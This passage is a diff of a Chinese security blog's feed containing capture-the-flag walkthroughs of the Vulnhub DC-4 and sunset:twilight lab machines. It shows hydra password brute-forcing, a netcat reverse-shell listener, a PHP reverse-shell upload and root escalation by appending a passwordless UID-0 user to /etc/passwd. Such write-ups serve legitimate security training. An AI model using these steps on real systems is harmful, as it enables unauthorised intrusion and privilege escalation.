-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.147.133 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
-<p>真的只开启了 <strong>22和80</strong> 两个端口</p>
-<h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324062452.png" alt="file"><br>一副可以爆破的样子,直接上 <code>rockyou</code> 字典</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt  192.168.147.133 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.147.133   login: admin   password: happy</span><br></pre></td></tr></table></figure>
-<p>得到了密码,登陆进去,可以运行三种指令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324336037.png" alt="file"></p>
-<p>可以抓包修改指令内容,也可以在前端修改html元素写上反弹shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586325632432.png" alt="file"><br>在本地监听之后<code>Run</code>就可以接收到shell</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.133] 34932</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
-<p>查看用户</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>
-<h3 id="登录到jim"><a href="#登录到jim" class="headerlink" title="登录到jim"></a>登录到jim</h3><p>挨个进去看看有啥(只有jim有东西)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd jim</span><br><span class="line">ls</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls -al back*</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .</span><br><span class="line">drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..</span><br><span class="line">-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak</span><br></pre></td></tr></table></figure>
-
-<p>看名字就知道应该是备份的旧密码,本地保存之后拿去用<code>hydra</code>爆破一下</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P password.txt ssh://192.168.147.133:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.147.133   login: jim   password: jibril04</span><br></pre></td></tr></table></figure>
-<p>得到密码之后连接上去</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.147.133</span><br><span class="line">jim@192.168.147.133&#39;s password:</span><br><span class="line"></span><br><span class="line">You have mail.</span><br><span class="line">jim@dc-4:~$ whoami</span><br><span class="line">jim</span><br></pre></td></tr></table></figure>
-<h3 id="切换到charles"><a href="#切换到charles" class="headerlink" title="切换到charles"></a>切换到charles</h3><p>他说有一个邮件,用<code>mail</code>命令查看一下邮件的路径</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jim@dc-4:/var$ mail</span><br><span class="line">Mail version 8.1.2 01/15/2001.  Type ? for help.</span><br><span class="line">&quot;/var/mail/jim&quot;: 1 message 1 unread</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays</span></span><br><span class="line">&amp; Held 1 message in /var/mail/jim</span><br><span class="line"></span><br><span class="line">cat /var/mail/jim</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
-<p>直接给密码,这也太棒了</p>
-<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>切换到<code>charles</code>用户,查找一下能够提权的东西</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">charles@dc-4:/var$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
-<p>这是啥指令,不知道,看一下help</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">teehee --help</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br></pre></td></tr></table></figure>
-<p>看到这条,可以写文件,并且是可以<code>sudo</code>的,就用它提权了(其实我不知道这里怎么提权,百度了资料)</p>
-<p>有两种办法,第一种是在<code>/etc/passwd</code>里面追加一个用户,和<code>root</code>的权限一样,第二种是修改定时任务<br>我用的是第一种</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">charles@dc-4:/var$ echo &quot;shiroha::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ cat /etc/passwd | grep &quot;shiroha&quot;</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ su shiroha</span><br><span class="line">root@dc-4:/var# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
-
-<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-4:/var# cat /root/</span><br><span class="line">.bash_history  .bashrc        flag.txt       .nano/         .profile       </span><br><span class="line">root@dc-4:/var# cat /root/flag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>vulnhub</category>
-        <category>DC</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>enum</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub DC-3靶机</title>
     <url>//DC-3.html</url>
     <content><![CDATA[<p>vulnhub里的 DC-3 靶机</p>
@@ -2034,6 +1986,54 @@
       <tags>
         <tag>exploit</tag>
         <tag>Joomla</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub DC-4靶机</title>
+    <url>//DC-4.html</url>
+    <content><![CDATA[<p>vulnhub里的 DC-4 靶机</p>
+<p>初学者难度</p>
+<a id="more"></a>
+
+<h2 id="靶机地址"><a href="#靶机地址" class="headerlink" title="靶机地址"></a>靶机地址</h2><p><a href="https://www.vulnhub.com/entry/dc-4,313/">vulnhub DC-4</a></p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="NMAP扫描得到IP地址"><a href="#NMAP扫描得到IP地址" class="headerlink" title="NMAP扫描得到IP地址"></a>NMAP扫描得到IP地址</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap 192.168.147.0/24</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.147.133</span><br><span class="line">Host is up (0.00047s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
+<p>主机发现,ip地址为<code>192.168.147.133</code>,进行详细的扫描</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.147.133 -p0-65535</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:60:57:06:6c:27:e0:2f:76:2c:e6:42:c0:01:ba:25 (RSA)</span><br><span class="line">|   256 e7:83:8c:d7:bb:84:f3:2e:e8:a2:5f:79:6f:8e:19:30 (ECDSA)</span><br><span class="line">|_  256 fd:39:47:8a:5e:58:33:99:73:73:9e:22:7f:90:4f:4b (ED25519)</span><br><span class="line">80/tcp open  http    nginx 1.15.10</span><br><span class="line">|_http-server-header: nginx/1.15.10</span><br><span class="line">|_http-title: System Tools</span><br><span class="line">MAC Address: 00:0C:29:DA:67:BF (VMware)</span><br></pre></td></tr></table></figure>
+<p>真的只开启了 <strong>22和80</strong> 两个端口</p>
+<h3 id="访问网站"><a href="#访问网站" class="headerlink" title="访问网站"></a>访问网站</h3><p><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324062452.png" alt="file"><br>一副可以爆破的样子,直接上 <code>rockyou</code> 字典</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt  192.168.147.133 http-post-form &quot;/login.php:username=^USER^&amp;password=^PASS^:S=logout&quot;</span><br><span class="line"></span><br><span class="line">[80][http-post-form] host: 192.168.147.133   login: admin   password: happy</span><br></pre></td></tr></table></figure>
+<p>得到了密码,登陆进去,可以运行三种指令<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586324336037.png" alt="file"></p>
+<p>可以抓包修改指令内容,也可以在前端修改html元素写上反弹shell<br><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-1586325632432.png" alt="file"><br>在本地监听之后<code>Run</code>就可以接收到shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@kali:/home/kali# nc -nvlp 8848</span><br><span class="line">listening on [any] 8848 ...</span><br><span class="line">connect to [192.168.147.130] from (UNKNOWN) [192.168.147.133] 34932</span><br><span class="line"></span><br><span class="line">whoami</span><br><span class="line">www-data</span><br></pre></td></tr></table></figure>
+<p>查看用户</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">charles</span><br><span class="line">jim</span><br><span class="line">sam</span><br></pre></td></tr></table></figure>
+<h3 id="登录到jim"><a href="#登录到jim" class="headerlink" title="登录到jim"></a>登录到jim</h3><p>挨个进去看看有啥(只有jim有东西)</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd jim</span><br><span class="line">ls</span><br><span class="line">backups</span><br><span class="line">mbox</span><br><span class="line">test.sh</span><br><span class="line">ls -al back*</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x 2 jim jim 4096 Apr  7  2019 .</span><br><span class="line">drwxr-xr-x 3 jim jim 4096 Apr  7  2019 ..</span><br><span class="line">-rw-r--r-- 1 jim jim 2047 Apr  7  2019 old-passwords.bak</span><br></pre></td></tr></table></figure>
+
+<p>看名字就知道应该是备份的旧密码,本地保存之后拿去用<code>hydra</code>爆破一下</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra -l jim -P password.txt ssh://192.168.147.133:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.147.133   login: jim   password: jibril04</span><br></pre></td></tr></table></figure>
+<p>得到密码之后连接上去</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh jim@192.168.147.133</span><br><span class="line">jim@192.168.147.133&#39;s password:</span><br><span class="line"></span><br><span class="line">You have mail.</span><br><span class="line">jim@dc-4:~$ whoami</span><br><span class="line">jim</span><br></pre></td></tr></table></figure>
+<h3 id="切换到charles"><a href="#切换到charles" class="headerlink" title="切换到charles"></a>切换到charles</h3><p>他说有一个邮件,用<code>mail</code>命令查看一下邮件的路径</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jim@dc-4:/var$ mail</span><br><span class="line">Mail version 8.1.2 01/15/2001.  Type ? for help.</span><br><span class="line">&quot;/var/mail/jim&quot;: 1 message 1 unread</span><br><span class="line"><span class="meta">&gt;</span><span class="bash">U  1 charles@dc-4       Sat Apr 06 21:15   27/715   Holidays</span></span><br><span class="line">&amp; Held 1 message in /var/mail/jim</span><br><span class="line"></span><br><span class="line">cat /var/mail/jim</span><br><span class="line"></span><br><span class="line">Hi Jim,</span><br><span class="line"></span><br><span class="line">I&#x27;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</span><br><span class="line"></span><br><span class="line">Password is:  ^xHhA&amp;hvim0y</span><br></pre></td></tr></table></figure>
+<p>直接给密码,这也太棒了</p>
+<h3 id="提权到root"><a href="#提权到root" class="headerlink" title="提权到root"></a>提权到root</h3><p>切换到<code>charles</code>用户,查找一下能够提权的东西</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">charles@dc-4:/var$ sudo -l</span><br><span class="line">Matching Defaults entries for charles on dc-4:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User charles may run the following commands on dc-4:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/teehee</span><br></pre></td></tr></table></figure>
+<p>这是啥指令,不知道,看一下help</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">teehee --help</span><br><span class="line"></span><br><span class="line">  -a, --append              append to the given FILEs, do not overwrite</span><br></pre></td></tr></table></figure>
+<p>看到这条,可以写文件,并且是可以<code>sudo</code>的,就用它提权了(其实我不知道这里怎么提权,百度了资料)</p>
+<p>有两种办法,第一种是在<code>/etc/passwd</code>里面追加一个用户,和<code>root</code>的权限一样,第二种是修改定时任务<br>我用的是第一种</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">charles@dc-4:/var$ echo &quot;shiroha::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ cat /etc/passwd | grep &quot;shiroha&quot;</span><br><span class="line">shiroha::0:0:::/bin/bash</span><br><span class="line">charles@dc-4:/var$ su shiroha</span><br><span class="line">root@dc-4:/var# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@dc-4:/var# cat /root/</span><br><span class="line">.bash_history  .bashrc        flag.txt       .nano/         .profile       </span><br><span class="line">root@dc-4:/var# cat /root/flag.txt </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">888       888          888 888      8888888b.                             888 888 888 888 </span><br><span class="line">888   o   888          888 888      888  &quot;Y88b                            888 888 888 888 </span><br><span class="line">888  d8b  888          888 888      888    888                            888 888 888 888 </span><br><span class="line">888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 </span><br><span class="line">888d88888b888 d8P  Y8b 888 888      888    888 d88&quot;&quot;88b 888 &quot;88b d8P  Y8b 888 888 888 888 </span><br><span class="line">88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P </span><br><span class="line">8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      &quot;   &quot;   &quot;   &quot;  </span><br><span class="line">888P     Y888  &quot;Y8888  888 888      8888888P&quot;   &quot;Y88P&quot;  888  888  &quot;Y8888  888 888 888 888 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Congratulations!!!</span><br><span class="line"></span><br><span class="line">Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those</span><br><span class="line">who have provided feedback, and who have taken time to complete these little</span><br><span class="line">challenges.</span><br><span class="line"></span><br><span class="line">If you enjoyed this CTF, send me a tweet via @DCAU7.</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>exploit</category>
+        <category>vulnhub</category>
+        <category>DC</category>
+      </categories>
+      <tags>
+        <tag>exploit</tag>
+        <tag>enum</tag>
       </tags>
   </entry>
   <entry>
@@ -3026,56 +3026,6 @@
       </tags>
   </entry>
   <entry>
-    <title>vulnhub sunset:twilight靶机</title>
-    <url>//sunset-twilight.html</url>
-    <content><![CDATA[<p>Vulnhub sunset系列</p>
-<a id="more"></a>
-
-<h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul>
-<li>靶机ip: <code>192.168.6.129</code></li>
-<li>kali ip: <code>192.168.6.128</code></li>
-</ul>
-<h2 id="端口扫描结果"><a href="#端口扫描结果" class="headerlink" title="端口扫描结果"></a>端口扫描结果</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, IgnoreSigpipes, LongColumnFlag, FoundRows, Support41Auth, SupportsMultipleStatments, SupportsAuthPlugins, SupportsMultipleResults</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: KGa5#NB&lt;G/R4L_w\H0YO</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">8080/tcp  open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-open-proxy: Proxy might be redirecting requests</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">63525/tcp open  http        PHP cli server 5.5 or later</span><br><span class="line">|_http-title: Login - powered by Easy File Sharing Web Server</span><br><span class="line">MAC Address: 00:0C:29:16:3E:01 (VMware)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br></pre></td></tr></table></figure>
-
-<p>大致上开启了 <code>80(http)</code> <code>2121(ftp)</code> 端口</p>
-<h2 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h2><p><img src="https://i.loli.net/2020/09/15/6sczx1kGXMPto7j.png" alt="image-20200915001829728"></p>
-<p>点击<code>pictures</code></p>
-<p><img src="https://i.loli.net/2020/09/15/gJoG9OAPnryvs3U.png" alt="image-20200915001902578"></p>
-<p>以为是<code>sql注入</code>结果手动尝试，并且<code>sqlmap</code>也测试了，并没有注入</p>
-<p><img src="https://i.loli.net/2020/09/15/1jLMHD6zTXm9iV4.png" alt="image-20200915001948217"></p>
-<h3 id="另辟蹊径"><a href="#另辟蹊径" class="headerlink" title="另辟蹊径"></a>另辟蹊径</h3><p>使用<code>dirb</code> 工具扫描网站目录</p>
-<p><img src="https://i.loli.net/2020/09/15/PBzlk1anFNH2Vi5.png" alt="image-20200915002033766"></p>
-<p>找到了这个目录，访问之后是文件上传</p>
-<p>由于没有检查文件后缀名，使用<code>burpsuite</code>抓包绕过检测，成功上传文件，一个<code>php_reverse_shell</code></p>
-<p><img src="https://i.loli.net/2020/09/15/lxBjwWnz5ZLuSky.png" alt="image-20200915002228601"></p>
-<p>通过目录扫描的结果可以得到文件上传的路径<code>http://192.168.6.129/gallery/original/ </code></p>
-<p>访问之后得到shell</p>
-<p><img src="https://i.loli.net/2020/09/15/ktvmBYsoruIbJyX.png" alt="image-20200915002345152"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>查找能提权的东西，找<code>setuid</code>权限的</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">/usr/sbin/exim4</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/var/www/html/gallery/maxImageUpload.zip</span><br><span class="line">/var/www/html/gallery/readme.txt</span><br><span class="line">/var/www/html/gallery/style/images/ok.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_bg.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_right.gif</span><br><span class="line">/var/www/html/gallery/style/images/button.gif</span><br><span class="line">/var/www/html/gallery/style/images/header_left.gif</span><br><span class="line">/var/www/html/gallery/style/images/nok.gif</span><br><span class="line">/var/www/html/gallery/style/style.css</span><br><span class="line">/var/www/html/gallery/maxImageUpload.class.php</span><br></pre></td></tr></table></figure>
-
-<p>看到php文件，以为是用php提权，结果发现并不是</p>
-<p>之前有过使用<code>exim4</code>提权的经验，所以尝试<code>exim</code>提权，结果也不是</p>
-<p>无奈偷偷看一眼参考答案，发现<code>/etc/passwd</code>居然可写。。。</p>
-<p><img src="https://i.loli.net/2020/09/15/RstrZGA693aq8mK.png" alt="image-20200915002707980"></p>
-<p>使用<code>openssl passwd -1 -salt stderr 1234</code>生成一个密码，写入一个账户即可</p>
-<p><img src="https://i.loli.net/2020/09/15/SN6MEGUA1qeZwIK.png" alt="image-20200915002803301"></p>
-<p>然后切换用户，得到<code>root</code>权限</p>
-<p><img src="https://i.loli.net/2020/09/15/s7QxtFDOg3TJHc8.png" alt="image-20200915002856988"></p>
-<p>这次的图不是很好看（</p>
-<p><img src="https://i.loli.net/2020/09/15/4Dy5HoJeqx6zXUV.png" alt="image-20200915002917639"></p>
-]]></content>
-      <categories>
-        <category>exploit</category>
-        <category>vulnhub</category>
-        <category>sunset</category>
-      </categories>
-      <tags>
-        <tag>exploit</tag>
-        <tag>file-upload</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>vulnhub sunset:dawn靶机</title>
     <url>//sunset-dawn.html</url>
     <content><![CDATA[<p>vulnhub里的 sunset:dawn 靶机</p>
@@ -3149,6 +3099,56 @@
       </tags>
   </entry>
   <entry>
+    <title>vulnhub sunset:twilight靶机</title>
+    <url>//sunset-twilight.html</url>
+    <content><![CDATA[<p>Vulnhub sunset系列</p>
+<a id="more"></a>
+
+<h1 id="sunset-Twilight"><a href="#sunset-Twilight" class="headerlink" title="sunset:Twilight"></a>sunset:Twilight</h1><ul>
+<li>靶机ip: <code>192.168.6.129</code></li>
+<li>kali ip: <code>192.168.6.128</code></li>
+</ul>
+<h2 id="端口扫描结果"><a href="#端口扫描结果" class="headerlink" title="端口扫描结果"></a>端口扫描结果</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">22/tcp    open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 43:e9:45:ec:f4:5b:ed:e9:64:47:43:43:39:96:9d:c9 (RSA)</span><br><span class="line">|   256 ed:67:ad:31:04:17:ef:cf:75:02:05:db:88:94:97:a0 (ECDSA)</span><br><span class="line">|_  256 ed:41:e5:d1:b2:23:2c:d5:90:59:2a:37:8b:da:31:c1 (ED25519)</span><br><span class="line">25/tcp    open  smtp        Exim smtpd 4.92</span><br><span class="line">| smtp-commands: twilight Hello nmap.scanme.org [192.168.6.128], SIZE 52428800, 8BITMIME, PIPELINING, CHUNKING, PRDR, HELP, </span><br><span class="line">|_ Commands supported: AUTH HELO EHLO MAIL RCPT DATA BDAT NOOP QUIT RSET HELP </span><br><span class="line">80/tcp    open  http        Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">445/tcp   open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)</span><br><span class="line">2121/tcp  open  ftp         pyftpdlib 1.5.6</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_-rw-r--r--   1 root     root           35 Jul 16 12:21 22253251-65325.twilight</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|  Connected to: 192.168.6.129:2121</span><br><span class="line">|  Waiting for username.</span><br><span class="line">|  TYPE: ASCII; STRUcture: File; MODE: Stream</span><br><span class="line">|  Data connection closed.</span><br><span class="line">|_End of status.</span><br><span class="line">3306/tcp  open  mysql       MySQL 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.22-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 38</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: InteractiveClient, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, SupportsTransactions, Speaks41ProtocolNew, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, SupportsLoadDataLocal, ODBCClient, 